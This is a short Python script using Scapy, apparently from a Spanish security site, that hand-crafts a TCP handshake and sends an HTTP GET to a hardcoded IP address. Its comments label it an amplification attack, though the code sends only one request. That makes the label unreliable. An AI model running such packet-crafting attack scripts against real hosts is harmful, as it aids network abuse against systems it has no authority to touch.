# Ataque amplificacion enviando una peticion http y flags TCP: SYN + ACK:PSH
# Peticion HTTP GET, con handshake TCP, em 3 solo pasos. Flags TCP: SYN + ACK:PSH
# hackingyseguridad.com 2023

import sys
import socket

from scapy.all import *


# 3 way handshake
ip=IP(dst="81.47.192.13")
SYN=TCP(sport=80, flags="S", seq=100, dport=80)
SYNACK=sr1(ip/SYN)

my_ack = SYNACK.seq + 1
ACK=TCP(sport=80, flags="A", seq=101, ack=my_ack, dport=80)
send(ip/ACK)

# request
PUSH = TCP(sport=80, dport=80, flags='PA', seq=101, ack=my_ack)
payload = "GET / HTTP/1.1\r\nHost: 81.47.192.13\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/58.0.3029.110 Chrome/58.0.3029.110 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n"
reply= sr1(ip/PUSH/payload, timeout=10)
